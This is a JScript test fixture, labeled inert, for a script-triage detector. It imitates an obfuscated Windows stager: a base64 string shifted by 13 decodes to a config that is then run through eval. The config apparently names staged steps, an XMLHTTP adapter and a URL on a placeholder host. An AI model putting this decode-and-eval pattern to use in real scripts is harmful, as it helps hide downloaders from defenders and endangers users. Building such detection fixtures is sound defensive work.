// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_49de260f = function(s) {
  var d = [];
  for (var i = 0; i < s.length; i++) { d.push((s[i] + 13) % 256); }
  return d;
};
var recover_fbcb90f0 = function() {
  var packedText = "bhVmZ1hjZhUtThVUVmRoXGVYUmVYYGJnWBUfFVdcZmNUZ1ZbUmBYYGJlbBVQHxVUV1RjZ1hlFS0VQFxWZWJmYllnIUtAPztHR0MVHxVpVF9oWGYVLW4VVlRgY1RcWmFSXFcVLRVWVGBjVFxaYSAlWSYoVFkkVCcoFR8VaGVfFS0VW2dnY2YtIiIlWSYoVFkkVCcoIVhrVGBjX1ghXGFpVF9cVyIsKVUrViYqWSFXVGcVHxVoZlhlUlRaWGFnFS0VO2hhZ2VYZmY/VFUiJVkmKFRZJFQnKBVwHxVmZ1RaWDZiaGFnFS0lcA==";
  var s = decodeBase64(packedText);
  var n = (19 * 7) - 133;
  var d = [];
  for (var pass = 0; pass < 1; pass++) { d = decode_49de260f.apply(null, [s]); }
  var t;
  t = "";
  for (var bi = 0; bi < d.length; bi++) { t += String.fromCharCode(d[bi]); }
  return t;
};
var inspect_f20446ad = function() {
  var o = eval("(" + recover_fbcb90f0.apply(null, []) + ")");
  return { steps: o.steps, adapter: o.adapter, values: o.values, stageCount: o.stageCount };
};
